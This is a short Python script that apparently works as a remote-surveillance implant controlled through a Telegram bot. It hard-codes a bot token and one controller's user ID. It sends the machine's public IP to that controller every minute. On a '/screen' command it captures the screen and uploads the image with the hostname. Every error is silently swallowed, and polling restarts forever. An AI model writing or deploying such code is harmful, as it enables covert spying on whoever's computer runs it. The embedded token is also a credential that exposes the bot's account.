import telebot
import pyautogui
from io import BytesIO
import socket
import os
import time
import requests
import subprocess
import threading

TOKEN = '8298701250:AAHfhWw3wk6Xw15UumisaB4avPyKDuid_SU'
MY_ID = 7497410701
bot = telebot.TeleBot(TOKEN)

def get_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except:
        return socket.gethostbyname(socket.gethostname())

@bot.message_handler(commands=['screen'])
def send_screen(message):
    if message.from_user.id == MY_ID:
        try:
            screen = pyautogui.screenshot()
            buf = BytesIO()
            screen.save(buf, format='PNG')
            buf.seek(0)
            bot.send_photo(MY_ID, buf, caption=f"🖥 PC: {socket.gethostname()} ({get_ip()})")
        except:
            pass

def pinger():
    while True:
        try:
            bot.send_message(MY_ID, f"PING_FROM_PC:{get_ip()}")
            time.sleep(60)
        except:
            time.sleep(10)

if __name__ == "__main__":
    threading.Thread(target=pinger, daemon=True).start()
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except:
            time.sleep(5)